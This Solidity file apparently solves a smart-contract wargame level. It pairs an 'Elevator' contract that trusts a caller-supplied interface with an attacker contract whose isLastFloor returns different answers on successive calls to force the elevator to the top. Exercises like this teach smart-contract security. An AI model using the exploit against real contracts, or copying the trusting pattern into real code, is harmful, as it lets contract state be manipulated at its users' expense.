pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external virtual returns (bool);
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}


contract ElevatorAttacker {

    Elevator elevator; 
    bool public flag;
    uint public timesCalled;

    constructor() public {
      elevator = Elevator(0xa9c320442Cf40A45449A2a2044072a1a16c957fC);
    }

    function attack() external payable {
    elevator.goTo(0);
}

function isLastFloor(uint256 ) external returns (bool) {
    timesCalled++;
    if (timesCalled > 1) return true;
    else return false;
}
}
